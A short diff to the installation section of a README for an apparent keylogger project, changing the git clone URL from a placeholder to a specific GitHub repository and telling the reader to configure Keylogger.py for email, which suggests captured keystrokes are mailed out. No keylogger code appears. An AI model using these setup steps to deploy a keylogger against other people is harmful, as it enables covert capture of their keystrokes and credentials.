@@ -35,7 +35,7 @@ textpip install pynput
 See requirements.txt for exact versions.
 Installation
 
-Clone the repository:textgit clone https://github.com/username/keylogger-project.git
+Clone the repository:textgit clone https://github.com/V-3-3-R/KEYLOGGER
 cd keylogger-project
 Install dependencies:textpip install -r requirements.txt
 (Optional) Review and edit Keylogger.py for email configuration (see Usage below).
